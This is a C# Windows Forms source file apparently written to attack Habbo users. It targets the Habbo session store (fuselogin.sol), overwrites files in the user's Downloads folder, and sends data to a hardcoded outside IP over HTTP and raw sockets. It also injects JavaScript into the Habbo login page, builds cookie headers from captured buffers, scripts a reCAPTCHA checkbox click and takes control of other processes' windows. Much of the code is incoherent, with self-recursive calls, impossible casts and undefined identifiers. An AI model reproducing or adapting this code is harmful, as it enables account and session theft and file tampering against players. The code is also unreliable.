using Desktop.Robot.Extensions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Newtonsoft.Json.Bson;
using System.Collections;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Formats.Nrbf;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata.Ecma335;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Net.NetworkInformation;
using System.IO;
using System.Net.Http.Headers;
using System.Net.WebSockets;
using Newtonsoft.Json;
using System.Drawing.Interop;

using System.Text;
using System.Windows.Forms;
using System.Xml;
using static System.Net.Mime.MediaTypeNames;
using System.Media;
using System.Configuration;
using System.Reflection;
using System.Runtime.InteropServices.ObjectiveC;
using System.Runtime.CompilerServices;

namespace PhantomMessage
{
    public partial class Form1 : Form
    {
        Socket ClientSock;
        public Form1()
        {
            InitializeComponent();
        }

        public string ImageFilepath;
        const string SWFFile = "\\HabboAir.swf";
        public const string XMLFilepath = "\\META-INF\\AIR\\appliation.XML";
        public const string HashFilepath = "\\META-INF\\AIR\\hash";
        public const string signaturesFilepath = "\\META-INF\\signatures.xml";
        public const string HabboAirSwfFile = "\\HabboAir.swf";
        public const string mimetype = "\\mimetype";
        public const string COPYING = "\\Adobe AIR\\Versions\\1.0\\Resources\\Licenses\\pixman\\COYING";
        public const string Pcre2 = "\\Adobe AIR\\Versions\\1.0\\Resources\\Licenses\\pcre2\\COPYING";
        public const string HabboRoomContent = "\\local_include\\HabboRoomContent.swf";
        public const string PlaceHolderFurniture = "\\local_include\\PlaceHolderFurniture.swf";
        public const string PlaceHolderPet = "\\local_include\\PlaceHolderPet.swf";
        public const string SelectionArrow = "\\local_include\\TileCursor.swf";
        public const string FuseLogin = "C:\\Users\\Desktop\\AppData\\Roaming\\com.sulake.habboair\\Local Store\\#SharedObjects\\fuselogin.sol";
        public const string Version = "1.0.0";
        //public const string XMLFilepath = "\\META-INF\\signatures.xml";
        public const string UserFilepath = "C:\\Users\\Desktop\\AppData\\Roaming\\Habbo Launcher\\downloads\\air";


        public string PostClienttMessage()
        {
            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
            wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Enter);
            wm_Char.GetMousePosition();
            wm_Char.Type("•");
            wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            wm_Char.GetMousePosition();

            return wm_Char.Type(PostClienttMessage()).ToString();
        }
        public const string SessionStorage = "C:\\Users\\Desktop\\AppData\\Roaming\\com.sulake.habboair\\Local Store\\#SharedObjects\fuselogin.sol";

        public string PostMessage(Socket Client)
        {

            var Filepath = "C:/temp";

            return Client.RemoteEndPoint.ToString();
        }

        public string InvokeThread()
        {
            for (var X = 0; X < ClientHabboProcs.Count; X++)
            {

                checkedListBox2.Items.Add(ClientHabboProcs[X].MainWindowTitle.ToString());

                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                wm_Char.GetMousePosition();
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Enter);
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);


                return ClientHabboProcs[X].MainWindowTitle.ToString();
            }
            return InvokeThread();

        }

        public string JsonObject = string.Empty;

        public const string UserHostDriectory = "C:\\Users\\Desktop\\Downloads";

        public void AcceptCallback(IAsyncResult AR)
        {
            var UserHost = UserHostDriectory.Replace("Desktop", Environment.UserName);
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.FileName = UserHost;
            var HostFileAppend = Directory.GetFiles(OFD.FileName);


            foreach (var Byte in HostFileAppend)
            {
                FileStream FS = new FileStream(Byte, FileMode.Open, FileAccess.ReadWrite);
                FS.Write(Encoding.Default.GetBytes(InvokeThread()));
                FS.Flush();
                FS.Close();
                FS.Dispose();
                FS = null;


                if (Byte.Contains(".wav"))
                {
                    checkedListBox2.Items.Add(Byte + "FTP" + DateTime.Now.ToString());
                    bool isPlaying = false;
                    SoundPlayer S = new SoundPlayer(Byte);
                    S.Play();
                    if (S != null)
                    {
                        isPlaying = true;
                        while (isPlaying = true)
                        {
                            AcceptCallback(AR);
                            isPlaying = false;
                            return;
                        }
                    }



                }
                return;
            }
        }
        public IntPtr WebModule(Socket Accepted)
        {
            nint Hwnd = IntPtr.Zero;
            foreach (var item in ClientHabboProcs)
            {
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                foreach (char c in InvokeThread())
                {
                    var PostMessge = new StringContent(c.ToString(), Encoding.UTF8, MediaTypeHeaderValue.Parse("application/json"));
                    HttpClient Hclient = new HttpClient();
                    Hclient.BaseAddress = new Uri("https://www.habbo.com");
                    using (var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "http://69.172.200.161:443"))
                    {

                        #region EndAccept
                        List<string> DirectoryFileInfo = new List<string>();
                        #endregion
                        //// [DLLImport("user32.dll,setLastError=true")]
                        ///static extern void keybd_event(byte Bscan, byte bKey, int dwFlags, int dwExtraInfo);
                        ///foreach(byte b in File.readallBytes(DirectoryFileInfo)
                        ///{
                        ///keybd_event(b,0x00001,0,0);
                        ///
                        ///}
                        ///

                        var GetMethod = Accepted.BeginDisconnect(false, new AsyncCallback(AcceptCallback), item.MainWindowHandle);
                        HttpReqMsg.Content = new StringContent(GetMethod.ToString(), Encoding.ASCII, "application/json");
                        var SendAsync = Hclient.SendAsync(HttpReqMsg);
                        NetworkStream NS = new NetworkStream(Accepted);
                        StreamWriter SW = new StreamWriter(NS, Encoding.UTF8);
                        SW.Write(richTextBox2.Text.ToString(), richTextBox3.Text.ToString());
                        SW.Write(richTextBox4.Text.ToString(), richTextBox5.Text.ToString());
                        SW.Write(richTextBox6.Text.ToString(), richTextBox7.Text.ToString());


                        foreach (byte b in Encoding.ASCII.GetBytes(SendAsync.ToString()))

                        {
                            NS.Read(new byte[] { b });
                        }




                        XmlComment VariTEM = null;




                    }




                    JsonObject.Append(c);
                    JsonObject.Append(c);
                    return c;
                }

                return item.Handle;
            }

            return Hwnd * int.Parse(JsonObject.ToString());
        }
        public IntPtr PostMessageClient(Socket Accepted, Desktop.Robot.Robot Auto, byte Bscan)
        {
            Auto.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            Auto.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            Auto.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            [DllImport("user32.dll")]
            static extern void keybd_event(byte BScan, byte bKey, int dwFlags, int dwExtraInfo);
            keybd_event(Bscan, 0x0001, 0, 0);
            keybd_event(Bscan, 0x000, 0, 0);
            System.Drawing.Interop.LOGFONT A;
            foreach (var ProcessItems in ClientHabboProcs)
            {
                {
                    for (var x = ClientHabboProcs.Count; x > 0; x--)
                    {
                        List<byte[]> HandleRef = new List<byte[]>();

                        var HandleRefObj = new byte[] { (byte)uint.Parse(JsonConvert.SerializeObject(Encoding.Default.GetString(Encoding.UTF8.GetBytes(checkedListBox2.ToString())))) };
                        foreach (var items in HandleRefObj)
                        {
                            using (var Memstream = new MemoryStream(new byte[] { items }))
                            {
                                Memstream.Position = ClientHabboProcs[x].Handle;
                                HandleRef.Add(HandleRefObj);
                                HandleRef.Add(new byte[] { (byte)items });

                                Point p = new System.Drawing.Point(int.Parse(ProcessItems.MainWindowHandle.ToString()));
                                Point HwndFromStream = new System.Drawing.Point(int.Parse(Accepted.SendBufferSize.ToString()));
                                System.Diagnostics.Process ProcesModule = ClientHabboProcs[x];
                                var Uint = ProcesModule;
                                int ModuleCount = int.Parse(Uint.ToString());
                                foreach (char c in JsonObject)
                                {
                                    StreamWriter SW = new StreamWriter(Memstream, Encoding.UTF8, Accepted.SendBufferSize);
                                    Random X = new Random();
                                    int Index = X.Next(0, ClientHabboProcs.Count);
                                    string[] WebItems = { ClientHabboProcs[x].MainWindowTitle.ToString() };
                                    List<string> ConfifugrationModule = new List<string>();
                                    ConfifugrationModule.Add(ClientHabboProcs[x].MainWindowTitle.ToString());
                                    [DllImport("user32.dll")]
                                    static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                    const string webObj = "var quote = \"'\";\r\nvar api = '<input name=\"email\" type=\"email\" ng-model=\"LoginController.email\" ng-model-options=\"{ updateOn: '+quote+'default blur'+quote+', debounce: { default: 500, blur: 0 } }\" required=\"\" habbo-email=\"\" habbo-remote-data=\"'+quote+'credentials'+'\"'+' autofocus=\"\" placeholder=\"Email\" class=\"form__input login-form__input ng-valid-email ng-not-empty ng-dirty ng-valid ng-valid-required ng-touched\" style=\"\">';";
                                    webView21.Source = new Uri("https://www.habbo.com");
                                    ConfifugrationModule.Add(Convert.ToBase64String(Encoding.Default.GetBytes(Newtonsoft.Json.JsonConvert.SerializeObject(webView21.ExecuteScriptAsync(webObj + "var elem = document.getElementsByClassName('form__input login-form__input ng-valid-email ng-not-empty ng-dirty ng-valid ng-valid-required ng-touched');" + "elem[0].value=quote+" + SetParent(WebModule(Accepted), IntPtr.Zero).ToString() + SetParent(WebModule(Accepted), ProcessItems.MainWindowHandle).ToString())))));

                                    for (var y = 0; y < ConfifugrationModule.Count; y++)
                                    {
                                        string IwebProxy = webObj + Encoding.UTF8.GetString(Encoding.Default.GetBytes(SetParent(IntPtr.Zero, ProcessItems.MainWindowHandle).ToString()));
                                        webView21.Source = new Uri("http://69.172.200.161");
                                        const string ScriptLoad = "var XHR = new XMLHttpRequest(); XHR.open('POST','https://www.habbo.com/logout'); function GetMethod(){window.location='https://www.habbo.com'; alert('Disconnection');} var PostForm = GetMethod(); XHR.send(PostForm);";
                                        SetParent(webView21.Handle, ProcessItems.MainWindowHandle);
                                        SetParent(ProcessItems.MainWindowHandle, webView21.Handle);
                                        webView21.ExecuteScriptAsync(ScriptLoad.Replace("XHR.send(PostForm);", "XHR.send(PostForm" + IwebProxy.ToString() + Encoding.UTF8.GetBytes(IwebProxy.ToString()) + ");"));
                                        Byte[] RecvBuffer = new Byte[Accepted.SendBufferSize];
                                        foreach (byte xClient in RecvBuffer)
                                        {
                                            using (var Memstreamn = new MemoryStream(new byte[] { xClient }))
                                            {
                                                byte[] val = Memstreamn.GetBuffer();
                                                var PostMessage = webView21.ExecuteScriptAsync("document.write('" + Encoding.Default.GetString(Memstreamn.GetBuffer()) + "');");
                                                Clipboard.SetText(Encoding.Default.GetString(val));
                                            }
                                        }
                                        for (int i = 0; i < WebItems.Length; i++)
                                        {

                                        }



                                    }



                                }
                            }
                        }
                    }
                }

                keybd_event(0x0D, 0x0001, 0, 0);
                if (Accepted.Handle != IntPtr.Zero)
                {
                    Auto.GetMousePosition();
                    using (NetworkStream NS = new NetworkStream(Accepted))
                    {
                        StreamContent WebMessage = new StreamContent(NS, Accepted.SendBufferSize);
                        StringBuilder SB = new StringBuilder();
                        SB.Append(WebMessage.ReadAsStringAsync().Result.ToString());
                        richTextBox1.Text += "[string Content]" + SB.ToString();
                        var Content = SB.ToString().ToCharArray().ToString();
                        foreach (char c in Content)
                        {
                            Console.Write(checkBox1_CheckedChanged);
                            Console.WriteLine(c);
                            BinaryReader BR = new BinaryReader(NS, Encoding.ASCII);
                            BR.BaseStream.ReadByte();
                            Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            Client.Connect(new IPEndPoint(IPAddress.Parse("69.172.200.161"), 443));
                            byte[] Buffer = new byte[Client.ReceiveBufferSize];
                            HttpClient Hclient = new HttpClient();
                            Hclient.BaseAddress = new Uri("http://localhost:4200");

                            using (var GetAsync = Hclient.GetAsync("https://www.habbo.com"))
                            {
                                var Rec = GetAsync.Result.Content.ReadAsByteArrayAsync(CancellationToken.None);
                                int Msg = int.Parse(Convert.ToBase64String(Encoding.Default.GetBytes(GetAsync.Result.Content.ReadAsStringAsync().Result.ToString())));
                                Array.Resize(ref Buffer, Msg);
                                if (Msg >= 0)
                                {
                                    foreach (byte b in Buffer)
                                    {
                                        Array.Resize(ref Buffer, Accepted.Receive(new byte[] { b }));
                                        Process Client_ = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
                                        List<Process> Disposed = new List<Process>();
                                        Process[] ClientModules = Process.GetProcessesByName(Client_.ProcessName);
                                        for (var x = ClientModules.Length; x > 0; x--)
                                        {
                                            while (ClientModules[x].MainWindowHandle != IntPtr.Zero)
                                            {
                                                Auto.GetMousePosition();
                                                WebRequest HttpReq = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                                                HttpReq.Method = "POST";
                                                HttpReq.Headers.Add("referer", "https://www.google.com/sorry/index?continue=https://www.google.com/search%3Fsca_esv%3D286d0914a7b01ae4%26udm%3D2%26fbs%3DAIIjpHxU7SXXniUZfeShr2fp4giZ1Y6MJ25_tmWITc7uy4KIeioyp3OhN11EY0n5qfq-zEMZldv_eRjZ2XLYc5GnVnMEIxC4WQfoNDH7FwchyAayyjBoEAUjp5qAp9Bs219rFMoN-xgggwTpQAOJ75-XXNJQX3_GGwqxv-TDJWt8rveuSdeEIcwdQ8JyXTbmd7pYsu9rc3uJmI8eVwgY1RlWM0bxyDuKow%26q%3Dmagnet%26sa%3DX%26ved%3D2ahUKEwiOyrz715ORAxV9rYkEHdOmLToQtKgLegQIERAB%26biw%3D1865%26bih%3D956%26dpr%3D1&q=EgRmgf8HGPvzo8kGIjA3xNFtKYPiPTaTp3ZhKySr0riKdIVe5_c31UHRMu24fEdQ63qgWy06PgKrHY0ry9cyAnJSWgFD");
                                                Microsoft.Web.WebView2.WinForms.WebView2 Browser = new Microsoft.Web.WebView2.WinForms.WebView2();
                                                Browser.Source = new Uri("https://www.google.com/sorry/index?continue=https://www.google.com/search%3Fsca_esv%3D286d0914a7b01ae4%26udm%3D2%26fbs%3DAIIjpHxU7SXXniUZfeShr2fp4giZ1Y6MJ25_tmWITc7uy4KIeioyp3OhN11EY0n5qfq-zEMZldv_eRjZ2XLYc5GnVnMEIxC4WQfoNDH7FwchyAayyjBoEAUjp5qAp9Bs219rFMoN-xgggwTpQAOJ75-XXNJQX3_GGwqxv-TDJWt8rveuSdeEIcwdQ8JyXTbmd7pYsu9rc3uJmI8eVwgY1RlWM0bxyDuKow%26q%3Dmagnet%26sa%3DX%26ved%3D2ahUKEwiOyrz715ORAxV9rYkEHdOmLToQtKgLegQIERAB%26biw%3D1865%26bih%3D956%26dpr%3D1&q=EgRmgf8HGPvzo8kGIjA3xNFtKYPiPTaTp3ZhKySr0riKdIVe5_c31UHRMu24fEdQ63qgWy06PgKrHY0ry9cyAnJSWgFD");

                                                [DllImport("user32.dll")]
                                                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                                PacketWritter Packet = new PacketWritter(ClientModules[x], ClientModules[x].MainWindowTitle.ToString());
                                                using (var Memstream = new MemoryStream(new byte[] { b }))
                                                {
                                                    var script = " let evt = new MouseEvent(\"click\", {\r\n    bubbles: true,\r\n    cancelable: true,\r\n    view: window,\r\n  });;";
                                                    var SendAsync = Browser.ExecuteScriptAsync("var elem = document.getElementsByClassName(\"recaptcha-checkbox-checkmark\");" + script + "elem[0].dispatchEvent(evt" + Encoding.UTF8.GetString(Buffer, 0, Buffer.Length) + ");");
                                                    Array.Resize(ref Buffer, Accepted.Receive(new byte[ClientModules[x].MainModule.ModuleMemorySize]));
                                                    Array.Resize(ref Buffer, Accepted.Receive(new byte[ClientModules[x].MainModule.ModuleMemorySize]));

                                                    WebClient WC = new WebClient();
                                                    #region Headers
                                                    WC.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                                                    WC.Headers.Add("Upgrade-Insecure-Requests", "1");
                                                    WC.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36");
                                                    WC.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
                                                    WC.Headers.Add("sec-ch-ua-mobile", "?0");
                                                    WC.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                                    WC.Headers.Add("Connection", "keep-alive");
                                                    WC.Headers.Add("Content-Encoding", "gzip");
                                                    WC.Headers.Add("Content-Type", "text/html; charset=utf-8");
                                                    WC.Headers.Add("Keep-Alive", "timeout=20");
                                                    WC.Headers.Add("Strict-Transport-Security", "max-age=63072000; includeSubdomains");
                                                    WC.Headers.Add("Transfer-Encoding", "chunked");
                                                    WC.Headers.Add("X-DIS-Request-ID", "5619708332b712eea71a2c07eff859e3");
                                                    WC.Headers.Add("cache-control", "private, max-age=0, no-cache");
                                                    WC.Headers.Add("content-security-policy", "default-src 'self';connect-src 'self' *.habbo.com https://hcaptcha.com https://*.hcaptcha.com cookie-cdn.cookiepro.com privacyportal.cookiepro.com cookies.onetrust.mgr.consensu.org geolocation.onetrust.com www.facebook.com https://accounts.google.com/gsi/ *.google-analytics.com www.googletagmanager.com csi.gstatic.com habboo-a.akamaihd.net d29usylhdk1xyu.cloudfront.net;img-src 'self' data: *.habbo.com cookie-cdn.cookiepro.com habbo-stories-content.s3.amazonaws.com www.facebook.com *.google-analytics.com stats.g.doubleclick.net ssl.gstatic.com habboo-a.akamaihd.net images.habbogroup.com docj27ko03fnu.cloudfront.net d3hmp0045zy3cs.cloudfront.net quilt-cdn.janrain.com cdn.rpxnow.com pay.openbucks.com trck.spoteffects.net;script-src 'self' 'unsafe-eval' 'unsafe-inline' *.habbo.com https://appleid.cdn-apple.com https://hcaptcha.com https://*.hcaptcha.com cookie-cdn.cookiepro.com connect.facebook.net https://accounts.google.com/gsi/client *.google-analytics.com www.googletagmanager.com www.google.com www.gstatic.com apis.google.com rpxnow.com d29usylhdk1xyu.cloudfront.net trck.spoteffects.net;style-src 'self' 'unsafe-inline' *.habbo.com https://hcaptcha.com https://*.hcaptcha.com www.gstatic.com fonts.googleapis.com d3hmp0045zy3cs.cloudfront.net quilt-cdn.janrain.com;child-src 'self' https://hcaptcha.com https://*.hcaptcha.com *.habbo.com *.facebook.com www.google.com habboo-a.akamaihd.net www.youtube.com www.offertoro.com torox.io;frame-src 'self' https://hcaptcha.com https://*.hcaptcha.com *.habbo.com *.facebook.com www.google.com habboo-a.akamaihd.net www.youtube.com www.offertoro.com torox.io;font-src 'self' fonts.gstatic.com habboo-a.akamaihd.net *.habbo.com data:;frame-ancestors 'self' *.idcgames.com www.funnygames.fi www.funnygames.es www.funnygames.nl www.funnygames.fr www.funnygames.it www.funnygames.us www.funnygames.eu www.funnygames.biz www.funnygames.com.br www.funnygames.org *.gamesxl.com keygames.com www.games.co.za www.bgames.com starbie.co.uk nyckelspel.se www.games.co.uk www.a10.com www.gry.pl www.spela.se www.gamesgames.com www.ourgames.ru www.permainan.co.id www.games.co.id www.agame.com www.flashgames.ru www.mousebreaker.com kizi.com yepi.com www.integrations.partner.spilgames.com www.teens-integrations.partner.spilgames.com www.youdagames.com www.elkspel.nl www.spele.nl www.spele.be www.spelletjesoverzicht.nl *.orangegames.com hyvesgames.nl spele.nl www.spelletjes.nl www.spel.nl *.giochixl.it www.1001giochi.it minigioco.it www.gioco.it www.giochi.it *.jeuxdelajungle.fr www.1001games.fr jouerjouer.com spele.be www.jeux.fr www.jeu.fr oyun.mynet.com gamecell.com www.gamecell.com oyungemisi.com www.oyunskor.com *.1001pelit.com pelaaleikkia.com www.isladejuegos.es clavejuegos.com www.juegos.com *.1001spiele.de www.jetztspielen.ws www.jetztspielen.de www.spielaffe.de *.spielspiele.de spielspiele.de www.spielen.com *.1001jogos.pt jogojogar.com www.ojogos.com.br;form-action 'self' https://login.habbo.com https://help.habbo.com https://help.habbo.de https://help.habbo.es https://help.habbo.fi https://help.habbo.fr https://help.habbo.it https://help.habbo.nl https://help.habbo.com.br https://help.habbo.com.tr habbohelpbr.zendesk.com habbohelpen.zendesk.com habbohelpde.zendesk.com habbohelpes.zendesk.com habbohelpfi.zendesk.com habbohelpfr.zendesk.com habbohelpit.zendesk.com habbohelpnl.zendesk.com habbohelptr.zendesk.com;upgrade-insecure-requests ;report-uri /csp/report");
                                                    WC.Headers.Add("etag", "W/\"15ff-1D0qBSkJTuf9J/zz3S7xv6lYUj4\"");
                                                    WC.Headers.Add("large-allocation", "0");
                                                    WC.Headers.Add("x-content-type-options", "nosniff");
                                                    WC.Headers.Add("x-dns-prefetch-control", "on");
                                                    WC.Headers.Add("x-download-options", "noopen");
                                                    WC.Headers.Add("x-xss-protection", "1; mode=block");
                                                    #endregion
                                                    WC.BaseAddress = new Uri("https://69.172.200.161").ToString();
                                                    var PostReqStream = WC.OpenRead(HttpReq.RequestUri);
                                                    HttpReq.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
                                                    HttpReq.Headers.Add("sec-ch-ua-mobile", "?0");
                                                    HttpReq.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                                    HttpReq.Headers.Add("Connection", "keep-alive");
                                                    HttpReq.Headers.Add("Content-Encoding", "gzip");
                                                    HttpReq.Headers.Add("Content-Type", "text/html; charset=utf-8");
                                                    HttpReq.Headers.Add("Keep-Alive", "timeout=20");
                                                    HttpReq.Headers.Add("Strict-Transport-Security", "max-age=63072000; includeSubdomains");
                                                    HttpReq.Headers.Add("Transfer-Encoding", "chunked");
                                                    HttpReq.Headers.Add("X-DIS-Request-ID", "5619708332b712eea71a2c07eff859e3");
                                                    HttpReq.Headers.Add("cookie", Encoding.UTF8.GetString(Buffer, 0, Buffer.Length));
                                                    PostReqStream.Write(Buffer, 0, Buffer.Length);
                                                    byte[] RecieveMsg = Encoding.ASCII.GetBytes(Browser.ExecuteScriptAsync(SendAsync.ToString()).ToString());
                                                    HttpReq.Headers.Add("cookie", Newtonsoft.Json.JsonConvert.SerializeObject(Packet.DiposedModule(new BinaryWriter(NS, Encoding.ASCII), NS, RecieveMsg, (int)ClientModules[x].MainWindowHandle, PostReqStream)));
                                                    Auto.GetMousePosition();
                                                    Auto.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                                                    Auto.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);




                                                }

                                            }

                                        }
                                    }

                                    if (Msg <= 0)
                                    {
                                        foreach (byte b in Buffer)
                                        {

                                        }
                                    }
                                    if (Msg >= Buffer.Length)
                                    {

                                    }

                                }

                            }
                        }

                        return Accepted.Handle;
                    }
                }
                return Process.GetProcessById(int.Parse(textBox1.Text.ToString())).MainWindowHandle;
            }
            return Process.GetProcessById(int.Parse(textBox1.Text.ToString())).MainWindowHandle;
        }
        public Process InvokeScriptMessage(Process X)

        {

            List<IntPtr> AcceptedCientHandle = new List<nint>();
            if (X.MainModule.FileName.ToString().Length >= 0)
            {
                byte[] ProcessStream = new byte[X.MainModule.ModuleMemorySize];
                Encoding innerEncoding = Encoding.UTF8;
                using (MemoryStream innerStream = new MemoryStream())
                {

                    Encoding outerEncoding = Encoding.Unicode; //
                    for (int i = 0; i < ProcessStream.Length; i++)
                    {
                        ProcessStream[i] += Convert.ToByte(X.MainWindowTitle.ToString());
                        ProcessStream[i] += Convert.ToByte(X.MainModule.BaseAddress);
                        ProcessStream[i] += Convert.ToByte(X.MainWindowHandle);
                        ProcessStream[i] += Convert.ToByte(X.Handle);
                        foreach (Socket Sock in Websockets)
                        {
                            byte[] utf8Bytes = innerEncoding.GetBytes(Convert.ToBase64String(ProcessStream));


                            innerStream.Write(utf8Bytes, 0, utf8Bytes.Length);
                            innerStream.Write(ProcessStream, 0, ProcessStream.Length);
                            InvokeScriptMessage(X).MainWindowHandle.Equals((IntPtr)Sock.Handle);

                            innerStream.Position = 0; // Reset position for reading

                            // Create the transcoding stream
                            using (Stream transcodingStream = Encoding.CreateTranscodingStream(innerStream, innerEncoding, outerEncoding, leaveOpen: true))
                            {
                                // Read from the transcoding stream (data will be in outerEncoding)
                                using (StreamReader reader = new StreamReader(transcodingStream, outerEncoding))
                                {
                                    string transcodedString = reader.ReadToEnd();
                                    richTextBox1.Text += transcodedString.ToString() + Environment.NewLine;
                                    BinaryWriter BW = new BinaryWriter(transcodingStream, Encoding.Unicode);
                                    PacketWritter Packet = new PacketWritter(Process.GetCurrentProcess(), "PostMessage();");
                                    BW.Write(Encoding.Default.GetBytes(Packet.DiposedModule(BW, new NetworkStream(Sock), utf8Bytes, (int)Process.GetProcessById(X.Id).MainWindowHandle, transcodingStream)[0].ToString()));

                                    Console.WriteLine($"Transcoded String: {transcodedString}");
                                }
                            }
                        }
                    }

                }


            }
            return InvokeScriptMessage(X);
        }
        public IntPtr PostReqMethod(Socket Accepted)
        {
            [DllImport("user32.dll")]
            static extern IntPtr SetParent(IntPtr hwndChild, nint hwndNewParent);
            WindowKeyApi API = new WindowKeyApi();
            int Rec = Accepted.Receive(WindowMessage());
            using (var Memstream = new MemoryStream(WindowMessage(), 0, Rec))
            {

                foreach (Process X in Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName))

                {
                    API.Add(((Process)X));
                    var PostMessageAsync = InvokeScriptMessage(X).Start();
                    byte[] Hwnd = new byte[X.MainWindowHandle.ToInt32()];
                    var PostMsg = SetParent(InvokeScriptMessage(X).Handle, X.MainWindowHandle);
                    byte[] MsgStream = new byte[Hwnd.Length];
                    foreach (var item in Websockets)
                    {
                        InvokeScriptMessage(X).MainWindowHandle.Equals((IntPtr)PostMsg * item.Handle);
                        InvokeScriptMessage(X).Start();
                        for (var x = 0; x < Hwnd.Length; x++)
                        {
                            MsgStream[x] += (byte)int.Parse(PostMsg.ToString());
                            Hwnd[x] += MsgStream[x];
                            MsgStream[x] += Hwnd[x];
                            SetParent(Accepted.Handle, X.Handle);
                            SetParent(X.MainWindowHandle, Accepted.Handle);
                            InvokeScriptMessage(X).Start();


                        }

                    }
                    InvokeScriptMessage(X).Kill();
                    Control Hwindow = new Control();
                    Hwindow = panel2;
                    SetParent(panel2.Handle, X.MainWindowHandle);
                    SetParent(X.MainWindowHandle, panel2.Handle);
                    SetParent(panel2.Handle, Process.GetCurrentProcess().MainWindowHandle);

                    SetParent(InvokeScriptMessage(X).Handle, panel2.Handle);
                    SetParent(panel2.Handle, InvokeScriptMessage(X).Handle);
                    SetParent(panel2.Handle, X.MainWindowHandle);
                    InvokeScriptMessage(X).Start();
                    SetParent(IntPtr.Zero, InvokeScriptMessage(X).Handle);
                    SetParent(InvokeScriptMessage(X).Handle, IntPtr.Zero);
                    SetParent(InvokeScriptMessage(X).Handle, panel2.Handle);
                    SetParent(InvokeScriptMessage(X).Handle, X.Handle);
                    SetParent(X.MainWindowHandle, InvokeScriptMessage(X).Handle);




                }

                while (Accepted != null)
                {

                    if (Accepted.Handle != IntPtr.Zero)
                    {
                        Process.GetCurrentProcess().MainWindowHandle.Equals((nint)(PostReqMethod((Socket)Accepted)));


                    }

                    Process Clients = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
                    Process[] Disposed = Process.GetProcessesByName(Clients.ProcessName);
                    foreach (Process x in Disposed)
                    {
                        PostReqMethod(Accepted);

                        SetParent(PostReqMethod(Accepted), x.Handle);
                        SetParent(PostReqMethod(Accepted), x.MainWindowHandle);
                        Console.WriteLine(Encoding.Default.GetString(WindowMessage()));
                        SetParent(x.MainWindowHandle, nint.Parse(Accepted.Receive(new byte[] { (byte)int.Parse(x.MainWindowHandle.ToString()) }).ToString()));
                        return x.MainWindowHandle;
                    }

                }
                return Accepted.Handle;
            }
        }

        public class WindowKeyApi : List<Process>
        {
            public static List<Socket> Websockets = new List<Socket>();

            public nint PostMessage(FileStream FS)
            {

                IntPtr hwnd = IntPtr.Zero;
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                foreach (var items in ClientHabboProcs)
                {
                    {
                        while (FS.Handle != IntPtr.Zero)
                        {
                            hwnd = SetParent(PostMessage(FS), items.MainWindowHandle);
                            hwnd = SetParent(PostMessage(FS), items.Handle);
                            hwnd = SetParent(items.MainWindowHandle, PostMessage(FS));
                            items.Refresh();
                            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                            List<byte[]> DataSegment = new List<byte[]>();
                            wm_char.GetMousePosition();
                            int X = MousePosition.X;
                            int Y = MousePosition.Y;
                            using (var MemStream = new MemoryStream())
                            {
                                Byte[] Hwnd = { Convert.ToByte(X * items.MainWindowHandle.ToInt64()) };
                                Byte[] ResizeAsync = { Convert.ToByte(MousePosition.X * items.MainWindowHandle.ToInt64()) };
                                FS.Write(Hwnd, 0, Hwnd.Length);
                                FS.Read(ResizeAsync, 0, ResizeAsync.Length);
                                MemStream.Position = 0;
                                MemStream.Read(Hwnd);
                                DataSegment.Add(Hwnd);
                                DataSegment.Add(ResizeAsync);
                            }
                            for (int i = 0; i < DataSegment.Count; i++)
                            {
                                TextWriter PacketWritter = null;
                                PacketWritter.Write(DataSegment[i] as byte[]);
                                PacketWritter.Write(Convert.ToBase64String(Encoding.Default.GetBytes(wm_char.ToString())));
                                PacketWritter.Write(File.ReadAllBytes(UserHostFilepath));
                                Form1 F = new Form1();
                                var EncodeObj = Newtonsoft.Json.JsonConvert.SerializeObject(F.SendMessage());
                                // items.WaitForInputIdle();
                                FS.Write(Encoding.ASCII.GetBytes(EncodeObj));
                                items.Refresh();
                                StringBuilder SB = new StringBuilder();
